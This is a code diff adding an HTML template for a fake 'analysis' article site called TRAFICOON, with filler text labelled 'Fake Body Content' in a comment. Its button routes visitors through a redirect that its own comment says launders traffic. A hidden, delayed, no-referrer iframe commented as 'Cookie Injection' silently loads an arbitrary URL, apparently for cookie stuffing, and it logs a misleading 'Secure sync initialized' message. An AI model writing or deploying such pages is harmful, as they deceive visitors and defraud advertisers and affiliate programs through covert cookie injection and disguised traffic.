@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ title }}</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,700;1,300&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #fff; color: #334155; }
+        .serif { font-family: 'Merriweather', serif; }
+        .prose p { margin-bottom: 1.5em; line-height: 1.8; font-size: 1.125rem; }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <nav class="bg-white border-b border-slate-100 sticky top-0 z-50">
+        <div class="max-w-3xl mx-auto px-4 h-16 flex items-center justify-between">
+            <a href="/" class="font-black text-xl tracking-tighter text-slate-900">TRAFICOON<span class="text-blue-600">.</span></a>
+            <span class="text-xs font-bold text-slate-400 uppercase tracking-widest">Analysis</span>
+        </div>
+    </nav>
+
+    <!-- Article Content -->
+    <main class="max-w-3xl mx-auto px-4 py-10">
+        <header class="mb-8 border-b border-slate-100 pb-8">
+            <span class="text-blue-600 font-bold text-xs uppercase tracking-widest">{{ category }}</span>
+            <h1 class="text-3xl md:text-4xl font-black text-slate-900 mt-3 mb-4 leading-tight serif">{{ title }}</h1>
+            <div class="text-slate-400 text-sm">Published: {{ date }}</div>
+        </header>
+
+        <!-- Fake Body Content -->
+        <div class="prose max-w-none text-slate-700 serif">
+            <p><strong>Market Analysis:</strong> Ensure the integrity of digital distribution networks requires a robust understanding of cloud-native architectures.</p>
+            <p>Our latest report indicates a significant shift in consumer behavior patterns regarding high-value assets. Experts suggest that diversification is key to maintaining portfolio stability in volatile markets.</p>
+            <p>To access the full technical report and real-time data charts, please proceed to the secure gateway below.</p>
+        </div>
+        
+        <!-- The Magic Button (Goes to Laundry) -->
+        <div class="mt-12 pt-8 border-t border-slate-100 text-center">
+            <a href="/redirect?url={{ target_url }}&type=organic" class="bg-slate-900 text-white px-8 py-4 rounded-full font-bold text-sm hover:bg-slate-800 transition shadow-xl hover:shadow-2xl transform hover:-translate-y-1 inline-block">
+                Read Full Report &rarr;
+            </a>
+        </div>
+    </main>
+
+    <!-- 🔥 Cookie Injection (Hidden) 🔥 -->
+    {% if cookie_url %}
+    <script>
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                var f = document.createElement('iframe');
+                f.style.display = 'none'; f.style.width = '1px'; f.style.height = '1px';
+                f.src = "{{ cookie_url }}";
+                f.referrerPolicy = "no-referrer";
+                document.body.appendChild(f);
+                console.log('Secure sync initialized.');
+            }, 2500); // 2.5 seconds delay
+        });
+    </script>
+    {% endif %}
+</body>
+</html>
